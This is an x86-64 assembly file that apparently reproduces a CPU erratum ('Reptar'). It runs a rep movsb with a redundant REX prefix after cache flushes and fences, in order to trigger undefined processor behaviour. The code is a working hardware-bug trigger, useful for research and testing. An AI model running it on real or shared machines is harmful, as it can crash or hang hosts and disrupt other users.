BITS 64

; rax ; USED (for CPUID temporarily)
; rbx ; USED (for CPUID temporarily)
; rcx ; USED (for CPUID and REP MOVSB)
; rdx ; USED (temporarily and for CPUID)
; rbp ; USED (magic 0xCC)
; rsp ; USED (for counter)
; rsi ; USED (for REP MOVSB)
; rdi ; USED (for REP MOVSB)
; r8  ; NOT USED
; r9  ; USED (data address)
; r10 ; NOT USED
; r11 ; NOT USED
; r12 ; NOT USED
; r13 ; NOT USED
; r14 ; NOT USED
; r15 ; NOT USED

global _start

%macro loopless_reptar 0
    align 128
    %%loop_for_every_iteration:
        ; FLUSH TO MAKE INSTRUCTIONS BELOW SLOW
        clflush [one]
        clflush [magic]
        clflush [r9]
        clflush [r9+64]
        clflush [r9+128]
        mfence
        lfence
        sfence
        cpuid

        add r9, [r9]
        mov rdx, [r9+64]
        lea rax, [r9]
        div qword [one+rdx]
        lea r9, [rax]
        mov rsi, [r9]
        cmp rbp, [magic+rsi+rdx]
        cmove rsi, r9
        mov rdi, [r9+128+rdx]
        lea rdi, [rsi+rdi]
        mov ecx, [one+rdx]
        xor ebp, ebp

        align 128
        %%reptar:
            rep
            db 0x44; rex.r
            movsb
        %%after_reptar:
            rep nop
            mov ebp, 0xcccccccc
            nop
%endmacro

section .data
    one: dq 0x1
    magic: dq 0xcccccccc
    data: times 512 db 0

section .text
    _start:
        mov r9, data
        mov ebp, 0xcccccccc
        xor rsp, rsp
        ; make sure these dont pf
        clflush [data]
        clflush [one]
        clflush [magic]
        mov rax, 24 ; sched_yield
        syscall
        %rep 2
            loopless_reptar
            inc rsp
        %endrep
    .end_of_program:
    hlt
